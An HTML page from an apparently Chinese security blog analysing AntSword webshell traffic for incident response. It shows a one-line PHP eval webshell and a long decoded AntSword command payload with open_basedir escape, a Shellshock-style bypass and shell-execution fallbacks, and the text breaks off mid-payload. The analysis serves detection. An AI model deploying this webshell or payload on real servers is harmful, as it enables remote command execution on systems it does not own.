@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='前言 做应急响应题遇到了蚁剑流量分析的题，就正好研究一下 蚁剑流量特征 基本特征 在kali虚拟机中用小皮面板开一个站点，然后上传一个木马文件 内容如'>
+<title>蚁剑流量分析</title>
+
+<link rel='canonical' href='https://blog.winglet.com/p/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/'>
+
+<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='蚁剑流量分析'>
+<meta property='og:description' content='前言 做应急响应题遇到了蚁剑流量分析的题，就正好研究一下 蚁剑流量特征 基本特征 在kali虚拟机中用小皮面板开一个站点，然后上传一个木马文件 内容如'>
+<meta property='og:url' content='https://blog.winglet.com/p/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/'>
+<meta property='og:site_name' content='Winglet&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-05-07T22:24:33&#43;08:00'/><meta property='article:modified_time' content='2024-05-07T22:24:33&#43;08:00'/><meta property='og:image' content='https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405082248171.png' />
+<meta name="twitter:title" content="蚁剑流量分析">
+<meta name="twitter:description" content="前言 做应急响应题遇到了蚁剑流量分析的题，就正好研究一下 蚁剑流量特征 基本特征 在kali虚拟机中用小皮面板开一个站点，然后上传一个木马文件 内容如"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405082248171.png' />
+    <link rel="shortcut icon" href="img/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "light");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    <img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/2.jpg" width="300" height="300" class="site-logo" loading="lazy" alt="Avatar">
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Winglet&#39;s Blog</a></h1>
+            <h2 class="site-description">翩若惊鸿，宛若游龙。</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/wingllllet'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://blog.winglet.com/" selected>中文</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#蚁剑流量特征">蚁剑流量特征</a>
+      <ol>
+        <li><a href="#基本特征">基本特征</a></li>
+        <li><a href="#执行命令">执行命令</a></li>
+        <li><a href="#上传文件">上传文件</a></li>
+        <li><a href="#下载文件">下载文件</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+                
+                    <img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405082248171.png" loading="lazy" alt="Featured image of post 蚁剑流量分析" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">蚁剑流量分析</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 07, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 2 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前言">前言</h2>
+<p>做应急响应题遇到了蚁剑流量分析的题，就正好研究一下</p>
+<h2 id="蚁剑流量特征">蚁剑流量特征</h2>
+<h3 id="基本特征">基本特征</h3>
+<p>在kali虚拟机中用小皮面板开一个站点，然后上传一个木马文件</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405072354139.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240507235421064"
+	
+	
+></p>
+<p>内容如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">#1.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>然后打开<code>wireshark</code>，接着用蚁剑进行连接，这时就可以抓到蚁剑流量的包了</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405072356675.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240507235611611"
+	
+	
+></p>
+<p>这个就是蚁剑连接该ip的流量包了，我们右键红框那条，然后查看<code>TCP流</code></p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405072357718.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240507235718646"
+	
+	
+></p>
+<p>这个就是蚁剑的流量包内容。现在可以总结蚁剑流量的基本特征</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="p">.</span><span class="w"> </span><span class="err">请求包中有</span><span class="o">`</span><span class="n">ini_set</span><span class="o">`</span><span class="err">函数</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">2</span><span class="p">.</span><span class="w"> </span><span class="err">连接命令在第一个</span><span class="o">=</span><span class="err">前</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">3</span><span class="p">.</span><span class="w"> </span><span class="err">使用的是</span><span class="n">php语言</span><span class="w">
+</span></span></span></code></pre></div><h3 id="执行命令">执行命令</h3>
+<p>现在在蚁剑中打开虚拟终端，输入<code>whoami</code>命令<img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405080002395.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240508000245366"
+	
+	
+></p>
+<p>接着去看流量包</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405080005670.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240508000520611"
+	
+	
+></p>
+<p>可以发现里面内容有了一些变化，将其url解码后，得到</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">cmd</span><span class="o">=@</span><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;display_errors&#34;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">);</span><span class="o">@</span><span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="nv">$opdir</span><span class="o">=@</span><span class="nx">ini_get</span><span class="p">(</span><span class="s2">&#34;open_basedir&#34;</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nv">$opdir</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ocwd</span><span class="o">=</span><span class="nx">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;SCRIPT_FILENAME&#34;</span><span class="p">]);</span><span class="nv">$oparr</span><span class="o">=</span><span class="nx">preg_split</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s2">&#34;Lzt8Oi8=&#34;</span><span class="p">),</span><span class="nv">$opdir</span><span class="p">);</span><span class="o">@</span><span class="nx">array_push</span><span class="p">(</span><span class="nv">$oparr</span><span class="p">,</span><span class="nv">$ocwd</span><span class="p">,</span><span class="nx">sys_get_temp_dir</span><span class="p">());</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$oparr</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nx">is_writable</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="k">continue</span><span class="p">;};</span><span class="nv">$tmdir</span><span class="o">=</span><span class="nv">$item</span><span class="o">.</span><span class="s2">&#34;/.bf363c62&#34;</span><span class="p">;</span><span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">)){</span><span class="k">continue</span><span class="p">;}</span><span class="nv">$tmdir</span><span class="o">=</span><span class="nx">realpath</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">);</span><span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">);</span><span class="o">@</span><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;open_basedir&#34;</span><span class="p">,</span> <span class="s2">&#34;..&#34;</span><span class="p">);</span><span class="nv">$cntarr</span><span class="o">=@</span><span class="nx">preg_split</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\//&#34;</span><span class="p">,</span><span class="nv">$tmdir</span><span class="p">);</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">sizeof</span><span class="p">(</span><span class="nv">$cntarr</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;..&#34;</span><span class="p">);};</span><span class="o">@</span><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;open_basedir&#34;</span><span class="p">,</span><span class="s2">&#34;/&#34;</span><span class="p">);</span><span class="o">@</span><span class="nx">rmdir</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">);</span><span class="k">break</span><span class="p">;};};;</span><span class="k">function</span> <span class="nf">asenc</span><span class="p">(</span><span class="nv">$out</span><span class="p">){</span><span class="k">return</span> <span class="nv">$out</span><span class="p">;};</span><span class="k">function</span> <span class="nf">asoutput</span><span class="p">(){</span><span class="nv">$output</span><span class="o">=</span><span class="nx">ob_get_contents</span><span class="p">();</span><span class="nx">ob_end_clean</span><span class="p">();</span><span class="k">echo</span> <span class="s2">&#34;319&#34;</span><span class="o">.</span><span class="s2">&#34;4a4&#34;</span><span class="p">;</span><span class="k">echo</span> <span class="o">@</span><span class="nx">asenc</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span><span class="k">echo</span> <span class="s2">&#34;5df&#34;</span><span class="o">.</span><span class="s2">&#34;af0b&#34;</span><span class="p">;}</span><span class="nx">ob_start</span><span class="p">();</span><span class="k">try</span><span class="p">{</span><span class="nv">$p</span><span class="o">=</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;v1c2cd0fd6bb3&#34;</span><span class="p">],</span><span class="mi">2</span><span class="p">));</span><span class="nv">$s</span><span class="o">=</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;t29c2b8006f9cb&#34;</span><span class="p">],</span><span class="mi">2</span><span class="p">));</span><span class="nv">$envstr</span><span class="o">=@</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;j3bef2f7ea0db5&#34;</span><span class="p">],</span><span class="mi">2</span><span class="p">));</span><span class="nv">$d</span><span class="o">=</span><span class="nx">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;SCRIPT_FILENAME&#34;</span><span class="p">]);</span><span class="nv">$c</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">==</span><span class="s2">&#34;/&#34;</span><span class="o">?</span><span class="s2">&#34;-c </span><span class="se">\&#34;</span><span class="si">{</span><span class="nv">$s</span><span class="si">}</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">:</span><span class="s2">&#34;/c </span><span class="se">\&#34;</span><span class="si">{</span><span class="nv">$s</span><span class="si">}</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">;</span><span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">==</span><span class="s2">&#34;/&#34;</span><span class="p">){</span><span class="o">@</span><span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;PATH=&#34;</span><span class="o">.</span><span class="nx">getenv</span><span class="p">(</span><span class="s2">&#34;PATH&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span><span class="p">);}</span><span class="k">else</span><span class="p">{</span><span class="o">@</span><span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;PATH=&#34;</span><span class="o">.</span><span class="nx">getenv</span><span class="p">(</span><span class="s2">&#34;PATH&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&#34;</span><span class="p">);}</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$envstr</span><span class="p">)){</span><span class="nv">$envarr</span><span class="o">=</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;|||asline|||&#34;</span><span class="p">,</span> <span class="nv">$envstr</span><span class="p">);</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$envarr</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="o">@</span><span class="nx">putenv</span><span class="p">(</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;|||askey|||&#34;</span><span class="p">,</span> <span class="s2">&#34;=&#34;</span><span class="p">,</span> <span class="nv">$v</span><span class="p">));}}}</span><span class="nv">$r</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{</span><span class="nv">$p</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="nv">$c</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span><span class="k">function</span> <span class="nf">fe</span><span class="p">(</span><span class="nv">$f</span><span class="p">){</span><span class="nv">$d</span><span class="o">=</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span><span class="o">@</span><span class="nx">ini_get</span><span class="p">(</span><span class="s2">&#34;disable_functions&#34;</span><span class="p">));</span><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$d</span><span class="p">)){</span><span class="nv">$d</span><span class="o">=</span><span class="k">array</span><span class="p">();}</span><span class="k">else</span><span class="p">{</span><span class="nv">$d</span><span class="o">=</span><span class="nx">array_map</span><span class="p">(</span><span class="s1">&#39;trim&#39;</span><span class="p">,</span><span class="nx">array_map</span><span class="p">(</span><span class="s1">&#39;strtolower&#39;</span><span class="p">,</span><span class="nv">$d</span><span class="p">));}</span><span class="k">return</span><span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">&amp;&amp;!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$d</span><span class="p">));};</span><span class="k">function</span> <span class="nf">runshellshock</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;/&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">fe</span><span class="p">(</span><span class="s1">&#39;putenv&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">fe</span><span class="p">(</span><span class="s1">&#39;error_log&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">fe</span><span class="p">(</span><span class="s1">&#39;mail&#39;</span><span class="p">)))</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nx">strstr</span><span class="p">(</span><span class="nx">readlink</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">),</span> <span class="s2">&#34;bash&#34;</span><span class="p">)</span> <span class="o">!=</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="nx">tempnam</span><span class="p">(</span><span class="nx">sys_get_temp_dir</span><span class="p">(),</span> <span class="s1">&#39;as&#39;</span><span class="p">);</span><span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;PHP_LOL=() { x; }; </span><span class="si">$c</span><span class="s2"> &gt;</span><span class="si">$tmp</span><span class="s2"> 2&gt;&amp;1&#34;</span><span class="p">);</span><span class="k">if</span> <span class="p">(</span><span class="nx">fe</span><span class="p">(</span><span class="s1">&#39;error_log&#39;</span><span class="p">))</span> <span class="p">{</span><span class="nx">error_log</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);}</span> <span class="k">else</span> <span class="p">{</span><span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;a@127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;-bv&#34;</span><span class="p">);}}</span> <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">False</span><span class="p">;}</span><span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span><span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span><span class="k">if</span> <span class="p">(</span><span class="nv">$output</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span><span class="k">print</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span><span class="k">return</span> <span class="k">True</span><span class="p">;}}</span><span class="k">return</span> <span class="k">False</span><span class="p">;};</span><span class="k">function</span> <span class="nf">runcmd</span><span class="p">(</span><span class="nv">$c</span><span class="p">){</span><span class="nv">$ret</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$d</span><span class="o">=</span><span class="nx">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;SCRIPT_FILENAME&#34;</span><span class="p">]);</span><span class="k">if</span><span class="p">(</span><span class="nx">fe</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)){</span><span class="o">@</span><span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span><span class="k">elseif</span><span class="p">(</span><span class="nx">fe</span><span class="p">(</span><span class="s1">&#39;passthru&#39;</span><span class="p">)){</span><span class="o">@</span><span class="nx">passthru</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span><span class="k">elseif</span><span class="p">(</span><span class="nx">fe</span><span class="p">(</span><span class="s1">&#39;shell_exec&#39;</span><span class="p">)){</span><span class="k">print</span><span class="p">(</span><span class="o">@</span><span class="nx">shell_exec</span><span class="p">(</span><span class="nv">$c</span><span class="p">));}</span><span class="k">elseif</span><span class="p">(</span><span class="nx">fe</span><span class="p">(</span><span class="s1">&#39;exec&#39;</span><span class="p">)){</span><span class="o">@</span><span class="nx">exec</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span><span class="k">print</span><span class="p">(</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;
